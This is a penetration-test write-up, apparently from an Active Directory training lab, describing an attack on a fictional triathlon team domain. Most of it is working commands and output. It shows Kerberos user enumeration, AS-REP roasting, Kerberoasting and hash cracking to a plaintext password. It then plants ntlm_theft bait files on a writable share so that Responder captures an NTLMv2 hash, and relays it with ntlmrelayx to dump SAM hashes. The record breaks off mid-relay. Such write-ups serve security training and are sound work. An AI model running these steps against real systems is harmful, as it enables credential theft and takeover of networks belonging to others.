# Objective and scope
The 2025 U.S. Elite Triathlon National Team has requested a penetration test on its internal network. They have granted access to their network via VPN, but no other information has been provided. Successful testers should prove full compromise by providing the NTLM hash for the "krbtgt" account.

Treat this like a real engagement, keeping in mind that **only** the lab environment assets are in scope for active testing
# Hosts
Bike server - **10.1.243.198**
Run server - **10.1.107.4**
Swim server - **10.1.195.77**
# Host file setup
```python
sudo nxc smb 10.1.243.198 --generate-hosts-file /etc/hosts                
[sudo] password for kali: 
SMB         10.1.243.198    445    BIKE-SRV         [*] Windows Server 2022 Build 20348 x64 (name:BIKE-SRV) (domain:tri.lab) (signing:False) (SMBv1:None)

sudo nxc smb 10.1.107.4 --generate-hosts-file /etc/hosts
SMB         10.1.107.4      445    RUN-SRV          [*] Windows Server 2022 Build 20348 x64 (name:RUN-SRV) (domain:tri.lab) (signing:True) (SMBv1:None) (Null Auth:True)

sudo nxc smb 10.1.195.77 --generate-hosts-file /etc/hosts
SMB         10.1.195.77     445    SWIM-SRV         [*] Windows Server 2022 Build 20348 x64 (name:SWIM-SRV) (domain:tri.lab) (signing:False) (SMBv1:None)
```
# Enumeration
## Bike server - **10.1.243.198**
### Open ports
```python
nmap -p- --min-rate=3000 BIKE-SRV.tri.lab
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 19:27 +0000
Nmap scan report for BIKE-SRV.tri.lab (10.1.243.198)
Host is up (0.091s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 44.08 seconds
```
### Nmap
```python
nmap -p 80,135,139,445,3389 -A --min-rate=3000 BIKE-SRV.tri.lab -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 19:29 +0000
Nmap scan report for BIKE-SRV.tri.lab (10.1.243.198)
Host is up (0.091s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

445/tcp  open  microsoft-ds?

3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-07T19:30:57+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TRI
|   NetBIOS_Domain_Name: TRI
|   NetBIOS_Computer_Name: BIKE-SRV
|   DNS_Domain_Name: tri.lab
|   DNS_Computer_Name: BIKE-SRV.tri.lab
|   DNS_Tree_Name: tri.lab
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-07T19:30:17+00:00
| ssl-cert: Subject: commonName=BIKE-SRV.tri.lab
| Not valid before: 2026-03-06T19:18:57
|_Not valid after:  2026-09-05T19:18:57

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Run server - **10.1.107.4**
### Open ports
```python
nmap -p- --min-rate=3000 RUN-SRV.tri.lab
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 19:32 +0000
Nmap scan report for RUN-SRV.tri.lab (10.1.107.4)
Host is up (0.091s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
3268/tcp  open  globalcatLDAP
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
49664/tcp open  unknown
49667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 44.09 seconds
```
### Nmap
```python
nmap -p 53,88,135,139,445,464,3268,3389,5985 -A --min-rate=3000 RUN-SRV.tri.lab -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 19:36 +0000
Nmap scan report for RUN-SRV.tri.lab (10.1.107.4)
Host is up (0.098s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus

88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-07 19:36:41Z)

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

445/tcp  open  microsoft-ds?

464/tcp  open  kpasswd5?

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tri.lab, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=RUN-SRV.tri.lab
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:RUN-SRV.tri.lab
| Not valid before: 2025-10-03T22:41:24
|_Not valid after:  2026-10-03T22:41:24

3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-07T19:37:35+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TRI
|   NetBIOS_Domain_Name: TRI
|   NetBIOS_Computer_Name: RUN-SRV
|   DNS_Domain_Name: tri.lab
|   DNS_Computer_Name: RUN-SRV.tri.lab
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-07T19:36:55+00:00
| ssl-cert: Subject: commonName=RUN-SRV.tri.lab
| Not valid before: 2026-03-06T19:19:03
|_Not valid after:  2026-09-05T19:19:03

5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: RUN-SRV; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Swim server - **10.1.195.77**
### Open ports
```python
nmap -p- --min-rate=3000 SWIM-SRV.tri.lab -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 19:38 +0000
Nmap scan report for SWIM-SRV.tri.lab (10.1.195.77)
Host is up (0.093s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 43.99 seconds
```
### Nmap
```python
nmap -p 135,445,3389 -sT -A --min-rate=3000 SWIM-SRV.tri.lab -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 19:41 +0000
Nmap scan report for SWIM-SRV.tri.lab (10.1.195.77)
Host is up (0.092s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC

445/tcp  open  microsoft-ds?

3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-07T19:42:27+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TRI
|   NetBIOS_Domain_Name: TRI
|   NetBIOS_Computer_Name: SWIM-SRV
|   DNS_Domain_Name: tri.lab
|   DNS_Computer_Name: SWIM-SRV.tri.lab
|   DNS_Tree_Name: tri.lab
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-07T19:41:47+00:00
| ssl-cert: Subject: commonName=SWIM-SRV.tri.lab
| Not valid before: 2026-03-06T19:18:58
|_Not valid after:  2026-09-05T19:18:58

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
## BIKE-SRV
There is no null auth
Guest account is disabled
## RUN-SRV
Null auth is enabled here, however i cannot look at any shares or enumerate any users
Guest account is disabled here as well
## SWIM-SRV
Null auth disabled here
Guest account disabled

# Users
After revisiting the scope i see that the request came from the US 2025 triathlon team and doing some research on its members
```python
Gwen Jorgensen
Kirsten Kasper
Taylor Knibb
Summer Rappaport
Gina Sereno
Taylor Spivey
Morgan Pearson
John Reed
Seth Rider
```
These are all the members
I can use username anarchy to generate some username variations
```python
./username-anarchy -i ../users.txt 
gwen
gwenjorgensen
gwen.jorgensen
gwenjorg
gwenj
g.jorgensen
gjorgensen
jgwen
j.gwen
jorgenseng
jorgensen
jorgensen.g
jorgensen.gwen
gj
kirsten
kirstenkasper
kirsten.kasper
kirstenk
kirskasp
k.kasper
kkasper
kkirsten
k.kirsten
kasperk
kasper
kasper.k
kasper.kirsten
kk
taylor
taylorknibb
taylor.knibb
taylorkn
taylknib
taylork
t.knibb
tknibb
ktaylor
k.taylor
knibbt
knibb
knibb.t
knibb.taylor
tk
summer
summerrappaport
summer.rappaport
summerra
summrapp
summerr
s.rappaport
srappaport
rsummer
r.summer
rappaports
rappaport
rappaport.s
rappaport.summer
sr
gina
ginasereno
gina.sereno
ginasere
ginas
g.sereno
gsereno
sgina
s.gina
serenog
sereno
sereno.g
sereno.gina
gs
taylorspivey
taylor.spivey
taylorsp
taylspiv
taylors
t.spivey
tspivey
staylor
s.taylor
spiveyt
spivey
spivey.t
spivey.taylor
ts
morgan
morganpearson
morgan.pearson
morganpe
morgpear
morganp
m.pearson
mpearson
pmorgan
p.morgan
pearsonm
pearson
pearson.m
pearson.morgan
mp
john
johnreed
john.reed
johnr
j.reed
jreed
rjohn
r.john
reedj
reed
reed.j
reed.john
jr
seth
sethrider
seth.rider
sethride
sethr
s.rider
srider
rseth
r.seth
riders
rider
rider.s
rider.seth
```
Ill put these into a txt file and run it against kerbrute to find valid users
## Valid users
```python
kerbrute userenum -d tri.lab --dc RUN-SRV.tri.lab potential-users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/07/26 - Ronnie Flathers @ropnop

2026/03/07 19:57:24 >  Using KDC(s):
2026/03/07 19:57:24 >  	RUN-SRV.tri.lab:88

2026/03/07 19:57:25 >  [+] VALID USERNAME:	 t.spivey@tri.lab
2026/03/07 19:57:25 >  [+] VALID USERNAME:	 m.pearson@tri.lab
2026/03/07 19:57:25 >  [+] VALID USERNAME:	 j.reed@tri.lab
2026/03/07 19:57:25 >  Done! Tested 127 usernames (3 valid) in 1.210 seconds
```
Found some valid users
# AS-REP roasting
```python
nxc ldap RUN-SRV.tri.lab -u users.txt -p '' --asreproast asrep.hash        
LDAP        10.1.107.4      389    RUN-SRV          [*] Windows Server 2022 Build 20348 (name:RUN-SRV) (domain:tri.lab) (signing:None) (channel binding:Never) 
LDAP        10.1.107.4      389    RUN-SRV          $krb5asrep$23$t.spivey@TRI.LAB:43ed904e4a98dad8e80b839e603861ea$9162b7c7bfbeafce3c4b51cc8deb2e0c9504485b0fa8c7ee49078531e2767ada59aab004243fe41586733bf2429d0e913b0cbe91fb159573efe06afff0a24b8d3a65eb330d9f264fbc4f7528de4bc4064ba178343ddb41a8dff551b885b52d3fb432eb64a3e390e00d1bff2d63bc5a972c85c054c0e8073ca1726724f45ee565efe3e6370f97713b565ecc9794cf73e9e4793cfd2a8cd52b252030d3b8c5949d3c9ee275c57aa7d8659cf630245ab64f7ce56560c00cd2df9d7059b732dbc84b45058600f14e5859c38510f8a429b0714a3db6a4af85bea6b1e21d53f12274172231
```
I have found a hash for the user `t.spivey`
This hash did not crack, but i can still use it
# Kerberoasting via AS-REP roasting leads to user compromise of `j.reed`
```python
nxc ldap RUN-SRV.tri.lab -u t.spivey -p '' --no-preauth-targets users.txt --kerberoasting kerb.hash 
LDAP        RUN-SRV.tri.lab 389    RUN-SRV          [*] Windows Server 2022 Build 20348 (name:RUN-SRV) (domain:tri.lab) (signing:None) (channel binding:Never) 
LDAP        RUN-SRV.tri.lab 389    RUN-SRV          [+] tri.lab\t.spivey account vulnerable to asreproast attack 
LDAP        RUN-SRV.tri.lab 389    RUN-SRV          [*] Total of records returned 1
LDAP        RUN-SRV.tri.lab 389    RUN-SRV          $krb5tgs$23$*j.reed$TRI.LAB$j.reed*$cdd8385cab44e6c64a736da6a4b64c3f$857d2fe30e960e15a57ed7b4b4844dce45f3bbd3e5aab41aba054b0d6fdb906f200acc0cb2f195e1547c4c2e3528ff3181e33ff30ccf8817b8134a2cd82ba288dfd3466884d0ebebf001d07d14f762ae54a246636f6dcfef4bcc70bee35fd096fd3d845b0f0b25cd6ea85fc5c6b9732d9fdb996e4fd35331b379f9b89de5e28a360971673837ac20339a341953626f52ba8b9e635b01881a1bcdfa6cbb2cc5dbef0319f871815ba80256cf7ca49d548d234dc51f80f066ecbb85e85a0932e8ad7adefa43661b395722a97885062ace3fd662bc1ade8919709c52d803228ddc065b7d14170e9f48a91d3a11bc387cbd2d1037130a36e5ae624eb2ede496c0cd938fc93b9d7d20ba97ab8ba8bf33c5bf1edcf9d1866fa37dddbd1a8668dd9ac2ff3ed999ac8622544a9eebe1a96272a7e31b86a99349830758ce1713112b875cfe100d10d8b84ba436c49bc9501e605f071494767c3139ece79c3951fe754b7eea107f825c4717ad028c3d3f1c9d4eb2fc0b85cb49a862f8528623a0c1c5a526008e626f0108d6dd9169c411a03f3ac8492a61b906f6ae54e1dca22af26c5c159f2c5d044f973689968dadb2408f61205031be6ee498588b94b7d1b3e891f086ef604343f8515b7089c8b2fdaa60fa91a2c6b8b12093fdd1fee807fec2057433aa841d5ff11e5010a60d9ab6e9d82381c025ec22f499cefadc5e474cc8762fb5b930759c3f03e453815f69e24d9012720437d7afbeade8f1c41b9c98e4a50c19344c7d9e65146dfa5fb76b974977ad956385b5ed15e75c10afda9515e6f55c45a067382d5c73078a8bde76fc6911a0f338fd27ac79b4366d5e1af9057aa1508deb17a9fea57cfed57b7dce7af71b1dec3a07f34e84713ce14ef325d7b4c81bcacccba6bd2d6b9b11f3ea80fbfe259473b606db6c71e97f961ce173f3a45cc6c6a72fd19519165662bfab8758f80094d32a2d44b29404808e7784c82ae7a7205296b54fc9d0d1af18ac74fe433eab409c947728a82b81f681fd249493cc24c336147e23af890048b6c9c21d300416143f68bb6daf2deb65b18072e139fedbf1369169ce236f87a948e4feec184dd376adf7639699a47f63672a34c9bca3f68e040f7c30ea27c81c7c461fb4d9d2e8ce35c9c870ea1c2ca26befb87e8c65095adb2c886980281711e9f4d8fff9e3ac24eb0c4a5bd5dab86551e2a784f537b4056896c50b5f6eb1648e182aa0cec8a9c71265d3ce00aca5462b800849f9e19e60290d79e1c9f6361d3f88043e64c44001665f52a2483eeb97a097a2d02c67b1c8a3552e17e69ccdee9329e9735ee28c64137ad3e3cfab1ad56538e260f4963daa6dd8a911b976e6260fc6862970ef71a3393b286d20d13ae56714
```
I now have the hash of the user `j.reed`
This hash is not cracking by regular means but i can try rule based cracking

## Cracking the hash
```python
hashcat -a 0 -r /usr/share/hashcat/rules/best64.rule kerb.hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*j.reed$TRI.LAB$j.reed*$cdd8385cab44e6c64a736da6a4b64c3f$857d2fe30e960e15a57ed7b4b4844dce45f3bbd3e5aab41aba054b0d6fdb906f200acc0cb2f195e1547c4c2e3528ff3181e33ff30ccf8817b8134a2cd82ba288dfd3466884d0ebebf001d07d14f762ae54a246636f6dcfef4bcc70bee35fd096fd3d845b0f0b25cd6ea85fc5c6b9732d9fdb996e4fd35331b379f9b89de5e28a360971673837ac20339a341953626f52ba8b9e635b01881a1bcdfa6cbb2cc5dbef0319f871815ba80256cf7ca49d548d234dc51f80f066ecbb85e85a0932e8ad7adefa43661b395722a97885062ace3fd662bc1ade8919709c52d803228ddc065b7d14170e9f48a91d3a11bc387cbd2d1037130a36e5ae624eb2ede496c0cd938fc93b9d7d20ba97ab8ba8bf33c5bf1edcf9d1866fa37dddbd1a8668dd9ac2ff3ed999ac8622544a9eebe1a96272a7e31b86a99349830758ce1713112b875cfe100d10d8b84ba436c49bc9501e605f071494767c3139ece79c3951fe754b7eea107f825c4717ad028c3d3f1c9d4eb2fc0b85cb49a862f8528623a0c1c5a526008e626f0108d6dd9169c411a03f3ac8492a61b906f6ae54e1dca22af26c5c159f2c5d044f973689968dadb2408f61205031be6ee498588b94b7d1b3e891f086ef604343f8515b7089c8b2fdaa60fa91a2c6b8b12093fdd1fee807fec2057433aa841d5ff11e5010a60d9ab6e9d82381c025ec22f499cefadc5e474cc8762fb5b930759c3f03e453815f69e24d9012720437d7afbeade8f1c41b9c98e4a50c19344c7d9e65146dfa5fb76b974977ad956385b5ed15e75c10afda9515e6f55c45a067382d5c73078a8bde76fc6911a0f338fd27ac79b4366d5e1af9057aa1508deb17a9fea57cfed57b7dce7af71b1dec3a07f34e84713ce14ef325d7b4c81bcacccba6bd2d6b9b11f3ea80fbfe259473b606db6c71e97f961ce173f3a45cc6c6a72fd19519165662bfab8758f80094d32a2d44b29404808e7784c82ae7a7205296b54fc9d0d1af18ac74fe433eab409c947728a82b81f681fd249493cc24c336147e23af890048b6c9c21d300416143f68bb6daf2deb65b18072e139fedbf1369169ce236f87a948e4feec184dd376adf7639699a47f63672a34c9bca3f68e040f7c30ea27c81c7c461fb4d9d2e8ce35c9c870ea1c2ca26befb87e8c65095adb2c886980281711e9f4d8fff9e3ac24eb0c4a5bd5dab86551e2a784f537b4056896c50b5f6eb1648e182aa0cec8a9c71265d3ce00aca5462b800849f9e19e60290d79e1c9f6361d3f88043e64c44001665f52a2483eeb97a097a2d02c67b1c8a3552e17e69ccdee9329e9735ee28c64137ad3e3cfab1ad56538e260f4963daa6dd8a911b976e6260fc6862970ef71a3393b286d20d13ae56714:Utah123
```
I have now cracked the hash

```python
j.reed:Utah123
```
Ill verify these creds

```python
nxc smb RUN-SRV.tri.lab -u j.reed -p 'Utah123' --shares
SMB         10.1.107.4      445    RUN-SRV          [*] Windows Server 2022 Build 20348 x64 (name:RUN-SRV) (domain:tri.lab) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.107.4      445    RUN-SRV          [+] tri.lab\j.reed:Utah123 
SMB         10.1.107.4      445    RUN-SRV          [*] Enumerated shares
SMB         10.1.107.4      445    RUN-SRV          Share           Permissions     Remark
SMB         10.1.107.4      445    RUN-SRV          -----           -----------     ------
SMB         10.1.107.4      445    RUN-SRV          ADMIN$                          Remote Admin
SMB         10.1.107.4      445    RUN-SRV          C$                              Default share
SMB         10.1.107.4      445    RUN-SRV          IPC$            READ            Remote IPC
SMB         10.1.107.4      445    RUN-SRV          NETLOGON        READ            Logon server share 
SMB         10.1.107.4      445    RUN-SRV          SYSVOL          READ            Logon server share
```
This user is now compromised
He has read access on the default shares, its also worth noting there is no non-default shares
It might be worth running Get-GPPPassword.py to find group policy passwords in these shares
So there is no group policy password in those shares
This also has no remote access of any kind on any of the systems

# Dumping users
```python
nxc smb RUN-SRV.tri.lab -u j.reed -p 'Utah123' --users-export ad-users.txt
SMB         10.1.107.4      445    RUN-SRV          [*] Windows Server 2022 Build 20348 x64 (name:RUN-SRV) (domain:tri.lab) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.107.4      445    RUN-SRV          [+] tri.lab\j.reed:Utah123 
SMB         10.1.107.4      445    RUN-SRV          -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.107.4      445    RUN-SRV          Administrator                 2025-10-03 21:35:16 0       Built-in account for administering the computer/domain 
SMB         10.1.107.4      445    RUN-SRV          Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.107.4      445    RUN-SRV          krbtgt                        2025-10-03 21:54:59 0       Key Distribution Center Service Account 
SMB         10.1.107.4      445    RUN-SRV          t.spivey                      2025-10-03 21:59:21 0        
SMB         10.1.107.4      445    RUN-SRV          j.reed                        2025-10-03 22:00:09 0        
SMB         10.1.107.4      445    RUN-SRV          e.ackerlund                   2025-10-03 22:01:04 0        
SMB         10.1.107.4      445    RUN-SRV          m.pearson                     2025-10-04 00:59:53 0        
SMB         10.1.107.4      445    RUN-SRV          j.reed_adm                    2025-10-06 17:03:55 0        
SMB         10.1.107.4      445    RUN-SRV          [*] Enumerated 8 local users: TRI
SMB         10.1.107.4      445    RUN-SRV          [*] Writing 8 local users to ad-users.txt
```
Here are all the users on the domain, ive exported them to userlist
There are no passwords stored in user descriptions

# Access to SMB as `j.reed`
So as previously identified i only have read access on the default shares on the DC but i may have other access on one of the other hosts
## SMB share access on BIKE-SRV
```python
nxc smb BIKE-SRV.tri.lab -u 'j.reed' -p 'Utah123' --shares
SMB         10.1.243.198    445    BIKE-SRV         [*] Windows Server 2022 Build 20348 x64 (name:BIKE-SRV) (domain:tri.lab) (signing:False) (SMBv1:None)
SMB         10.1.243.198    445    BIKE-SRV         [+] tri.lab\j.reed:Utah123 
SMB         10.1.243.198    445    BIKE-SRV         [*] Enumerated shares
SMB         10.1.243.198    445    BIKE-SRV         Share           Permissions     Remark
SMB         10.1.243.198    445    BIKE-SRV         -----           -----------     ------
SMB         10.1.243.198    445    BIKE-SRV         ADMIN$                          Remote Admin
SMB         10.1.243.198    445    BIKE-SRV         C$                              Default share
SMB         10.1.243.198    445    BIKE-SRV         IPC$            READ            Remote IPC
```
## SMB share access on SWIM-SRV
```python
nxc smb SWIM-SRV.tri.lab -u 'j.reed' -p 'Utah123' --shares
SMB         10.1.195.77     445    SWIM-SRV         [*] Windows Server 2022 Build 20348 x64 (name:SWIM-SRV) (domain:tri.lab) (signing:False) (SMBv1:None)
SMB         10.1.195.77     445    SWIM-SRV         [+] tri.lab\j.reed:Utah123 
SMB         10.1.195.77     445    SWIM-SRV         [*] Enumerated shares
SMB         10.1.195.77     445    SWIM-SRV         Share           Permissions     Remark
SMB         10.1.195.77     445    SWIM-SRV         -----           -----------     ------
SMB         10.1.195.77     445    SWIM-SRV         ADMIN$                          Remote Admin
SMB         10.1.195.77     445    SWIM-SRV         C$                              Default share
SMB         10.1.195.77     445    SWIM-SRV         IPC$            READ            Remote IPC
SMB         10.1.195.77     445    SWIM-SRV         TransitionZone$ READ,WRITE
```
I have read and write access on `TransitionZone$` 

# Watering hole attack on `TransitionZone$` share
```python
smbclient.py tri.lab/'j.reed':'Utah123'@SWIM-SRV.tri.lab
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
TransitionZone$
# use TransitionZone$
# ls
drw-rw-rw-          0  Mon Mar  9 16:58:47 2026 .
drw-rw-rw-          0  Fri Oct  3 23:18:21 2025 ..
# 
```
So the share itself is empty, so ill try a watering hole attack
## Generating malicious files
```python
python3 ntlm_theft.py -g modern -s 10.200.38.252 -f meeting
/home/kali/hsm/Triathlon/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Skipping SCF as it does not work on modern Windows
Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
Created: meeting/meeting.lnk (BROWSE TO FOLDER)
Created: meeting/meeting.rtf (OPEN)
Created: meeting/meeting-(stylesheet).xml (OPEN)
Created: meeting/meeting-(fulldocx).xml (OPEN)
Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(includepicture).docx (OPEN)
Created: meeting/meeting-(remotetemplate).docx (OPEN)
Created: meeting/meeting-(frameset).docx (OPEN)
Created: meeting/meeting-(externalcell).xlsx (OPEN)
Created: meeting/meeting.wax (OPEN)
Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: meeting/meeting.asx (OPEN)
Created: meeting/meeting.jnlp (OPEN)
Created: meeting/meeting.application (DOWNLOAD AND OPEN)
Created: meeting/meeting.pdf (OPEN AND ALLOW)
Skipping zoom as it does not work on the latest versions
Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
Skipping Autorun.inf as it does not work on modern Windows
Skipping desktop.ini as it does not work on modern Windows
Created: meeting/meeting.theme (THEME TO INSTALL
Generation Complete.
```
This generated the files
## Starting responder
```python
sudo responder -I tun0
```
## Planting file and retrieving hash
```python
smbclient.py tri.lab/'j.reed':'Utah123'@SWIM-SRV.tri.lab
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
TransitionZone$
# use TransitionZone$
# put meeting*
[-] [Errno 2] No such file or directory: 'meeting*'
# mput meeting*
*** Unknown syntax: mput meeting*
# put meeting.lnk
# ls
drw-rw-rw-          0  Mon Mar  9 17:10:21 2026 .
drw-rw-rw-          0  Fri Oct  3 23:18:21 2025 ..
-rw-rw-rw-       2164  Mon Mar  9 17:10:21 2026 meeting.lnk
# 
```
I places the .lnk file in there and after a minute on responder

```python
[SMB] NTLMv2-SSP Client   : 10.1.195.77
[SMB] NTLMv2-SSP Username : TRI\e.ackerlund
[SMB] NTLMv2-SSP Hash     : e.ackerlund::TRI:94b2feabe398041c:D659C23CB350D8DA1574D3836993CB7B:010100000000000080889997E7AFDC01C2F197C466D545CD00000000020008004600350036004E0001001E00570049004E002D004B0045005A004F004B00480058005400440047004E0004003400570049004E002D004B0045005A004F004B00480058005400440047004E002E004600350036004E002E004C004F00430041004C00030014004600350036004E002E004C004F00430041004C00050014004600350036004E002E004C004F00430041004C000700080080889997E7AFDC0106000400020000000800300030000000000000000000000000200000DF66380DEC69D59934ADE59695AB0E7530BCA80618F9289B51618718355441840A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00330038002E003200350032000000000000000000
```
Ive got the users hash
This hash wont crack, ive tried multiple different rules but no luck
But since SMB signing is disabled on the BIKE-SRV and the SWIM-SRV i can try NTLM relay

# NTLM Relay leads to administrator access on BIKE-SRV
```python
ntlmrelayx.py -t smb://BIKE-SRV -smb2support
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.1.195.77, attacking target smb://BIKE-SRV
[*] (SMB): Authenticating connection from TRI/E.ACKERLUND@10.1.195.77 against smb://BIKE-SRV SUCCEED [1]
[*] (SMB): Received connection from 10.1.195.77, attacking target smb://BIKE-SRV
[*] smb://TRI/E.ACKERLUND@bike-srv [1] -> Service RemoteRegistry is in stopped state
[*] (SMB): Authenticating connection from TRI/E.ACKERLUND@10.1.195.77 against smb://BIKE-SRV SUCCEED [2]
[*] smb://TRI/E.ACKERLUND@bike-srv [1] -> Starting service RemoteRegistry
[*] (SMB): Authenticating connection from TRI/E.ACKERLUND@10.1.195.77 against smb://BIKE-SRV SUCCEED [3]
[-] smb://TRI/E.ACKERLUND@bike-srv [3] -> Error occurs while reading from remote(104)
[-] smb://TRI/E.ACKERLUND@bike-srv [2] -> Error while reading from remote
[*] (SMB): Received connection from 10.1.195.77, attacking target smb://BIKE-SRV
[*] (SMB): Authenticating connection from TRI/E.ACKERLUND@10.1.195.77 against smb://BIKE-SRV SUCCEED [4]
[*] (SMB): Received connection from 10.1.195.77, attacking target smb://BIKE-SRV
[*] (SMB): Authenticating connection from TRI/E.ACKERLUND@10.1.195.77 against smb://BIKE-SRV SUCCEED [5]
[-] smb://TRI/E.ACKERLUND@bike-srv [5] -> Error occurs while reading from remote(104)
[*] (SMB): Received connection from 10.1.195.77, attacking target smb://BIKE-SRV
[*] smb://TRI/E.ACKERLUND@bike-srv [1] -> Target system bootKey: 0x841dce84254e425358d2d10fe21645b2
[*] (SMB): Authenticating connection from TRI/E.ACKERLUND@10.1.195.77 against smb://BIKE-SRV SUCCEED [6]
[*] smb://TRI/E.ACKERLUND@bike-srv [4] -> Target system bootKey: 0x841dce84254e425358d2d10fe21645b2
[*] smb://TRI/E.ACKERLUND@bike-srv [1] -> Dumping local SAM hashes (uid:rid:lmhash:nthash)
[*] smb://TRI/E.ACKERLUND@bike-srv [4] -> Dumping local SAM hashes (uid:rid:lmhash:nthash)
[*] smb://TRI/E.ACKERLUND@bike-srv [6] -> Target system bootKey: 0x841dce84254e425358d2d10fe21645b2
[*] smb://TRI/E.ACKERLUND@bike-srv [6] -> Dumping local SAM hashes (uid:rid:lmhash:nthash)
[*] (SMB): Received connection from 10.1.195.77, attacking target smb://BIKE-SRV
[*] (SMB): Authenticating connection from TRI/E.ACKERLUND@10.1.195.77 against smb://BIKE-SRV SUCCEED [7]
[*] (SMB): Received connection from 10.1.195.77, attacking target smb://BIKE-SRV
[*] (SMB): Authenticating connection from TRI/E.ACKERLUND@10.1.195.77 against smb://BIKE-SRV SUCCEED [8]
[*] smb://TRI/E.ACKERLUND@bike-srv [7] -> Target system bootKey: 0x841dce84254e425358d2d10fe21645b2
